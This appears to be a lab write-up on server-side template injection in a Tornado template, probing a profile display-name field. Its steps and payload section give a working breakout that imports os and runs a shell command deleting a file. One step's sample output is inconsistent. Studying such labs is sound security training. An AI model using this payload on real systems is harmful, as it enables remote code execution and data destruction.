# Lab: Basic server-side template injection (code context)

## Description
This lab is vulnerable to SSTI where the input is placed within a code context in the template.

## Analysis
The application uses the `user.name` property in a template. We can modify our name in the user profile. The lab hints that the template is `Hi {{user.name}}`. However, the input is actually placed inside a function call or a similar context.

When we set our name to `test`, the template might look like: `greeting("test")`.
We can break out of this context using a closing parenthesis and a separator.

## Exploitation
I need to break out of the string and execute a command.

### Steps
1. Log in and go to your profile.
2. Change your name to `test}}`. If it causes an error, it's a good sign.
3. Try `test}}{7*7}`. If it renders as `test}}49`, it's vulnerable.
4. The template engine is Tornado (Python).
5. To execute commands in Tornado, I can import the `os` module:
   `{{import os}}{{os.system('rm /home/carlos/morale.txt')}}`
6. However, in this specific code context, we might need to close the existing tag first.
   Payload: `blog-post-author-display=user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')}}`

## Payload
```text
}}{% import os %}{{os.system('rm /home/carlos/morale.txt')}}
```

## Takeaways
- SSTI can occur even if the input is not directly rendered as a string.
- Understanding the context (e.g., inside a function, inside a string) is crucial for crafting the breakout payload.
